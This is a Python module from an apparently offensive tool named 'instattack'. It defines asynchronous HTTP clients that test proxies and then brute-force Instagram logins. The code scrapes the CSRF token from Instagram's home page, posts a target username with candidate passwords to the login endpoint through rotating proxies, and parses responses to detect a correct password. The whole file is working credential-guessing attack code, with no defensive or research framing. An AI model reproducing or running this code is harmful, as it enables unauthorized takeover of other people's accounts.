import asyncio
import re

from instattack.config import constants, config
from instattack.lib import logger

from instattack.core.models import InstagramResult
from instattack.core.exceptions import (InstagramResultError, HTTP_RESPONSE_ERRORS,
    HTTP_REQUEST_ERRORS)


log = logger.get(__name__)


class client:

    def __init__(self, loop, on_error, on_success):
        self.loop = loop
        self.on_error = on_error
        self.on_success = on_success

    def post(self, session, url, proxy, headers=None, data=None):
        return session.post(
            url,
            headers=headers,
            data=data,
            ssl=False,
            proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
        )

    async def request_wrapper(self, coro, proxy):
        try:
            return await coro

        except asyncio.CancelledError:
            pass

        # This will catch 400 errors - needed outside of the post block.
        except HTTP_RESPONSE_ERRORS as e:
            await self.on_error(proxy, e)

        except HTTP_REQUEST_ERRORS as e:
            await self.on_error(proxy, e)


class train_client(client):

    DATA = {
        'test_field_1': 'test_value_1',
        'test_field_2': 'test_value_2'
    }
    HEADERS = constants.HEADERS()

    def post(self, session, proxy):
        return super(train_client, self).post(
            session=session,
            url=constants.TEST_POST_URL,
            proxy=proxy,
            headers=self.HEADERS,
            data=self.DATA
        )

    async def _request(self, session, proxy):
        # Note: We do not update the time of the proxy here, that should only be
        # for the login requests.
        async with self.post(
            session=session,
            proxy=proxy  # Only Http Proxies Are Supported by AioHTTP
        ) as response:
            try:
                response.raise_for_status()

            except HTTP_RESPONSE_ERRORS as e:
                await self.on_error(proxy, e)

            else:
                json = await response.json()
                await self.on_success(proxy)

                return json['form']

    async def request(self, session, token, password, proxy):
        return await self.request_wrapper(self._request(
            session=session,
            proxy=proxy,
        ), proxy=proxy)


class instagram_client(client):

    def __init__(self, *args, **kwargs):
        super(instagram_client, self).__init__(*args, **kwargs)
        self.user = self.loop.user

    def post(self, session, password, proxy, token):

        data = {
            constants.INSTAGRAM_USERNAME_FIELD: self.user.username,
            constants.INSTAGRAM_PASSWORD_FIELD: password
        }
        headers = constants.HEADERS(token)

        return super(instagram_client, self).post(
            session=session,
            url=constants.INSTAGRAM_LOGIN_URL,
            proxy=proxy,
            headers=headers,
            data=data,
        )

    async def get_token(self, session):
        """
        Sends a basic request to the INSTAGRAM home URL in order to parse the
        response and get the cookies and token.
        """
        async with session.get(constants.INSTAGRAM_URL) as response:
            text = await response.text()
            token = re.search(r'(?<="csrf_token":")\w+', text).group(0)
        return token, response.cookies

    async def _login(self, session, token, password, proxy):

        async def parse_response_result(result, password, proxy):
            """
            Raises an exception if the result that was in the response is either
            non-conclusive or has an error in it.

            If the result does not have an error and is non conslusive, than we
            can assume that the proxy was most likely good.
            """
            result = InstagramResult.from_dict(result, proxy=proxy, password=password)
            if result.has_error:
                raise InstagramResultError(result.error_message)
            else:
                if not result.conclusive:
                    raise InstagramResultError("Inconslusive result.")
                return result

        async def raise_for_result(response):
            """
            Since a 400 response will have valid json that can indicate an authentication,
            via a `checkpoint_required` value, we cannot raise_for_status until after
            we try to first get the response json.
            """
            if response.status != 400:
                response.raise_for_status()
                json = await response.json()
                result = await parse_response_result(json, password, proxy)
                return result
            else:
                # Parse JSON First
                json = await response.json()
                try:
                    return await parse_response_result(json, password, proxy)  # noqa
                except InstagramResultError as e:
                    # Be Careful: If this doesn't raise a response the result will be None.
                    response.raise_for_status()

        async with self.post(
            session=session,
            token=token,
            password=password,
            proxy=proxy  # Only Http Proxies Are Supported by AioHTTP
        ) as response:
            try:
                result = await raise_for_result(response)

            except HTTP_RESPONSE_ERRORS as e:
                await self.on_error(proxy, e)

            else:
                await self.on_success(proxy)
                return result

    async def login(self, session, token, password, proxy):
        return await self.request_wrapper(self._login(
            session=session,
            token=token,
            password=password,
            proxy=proxy,
        ), proxy=proxy)
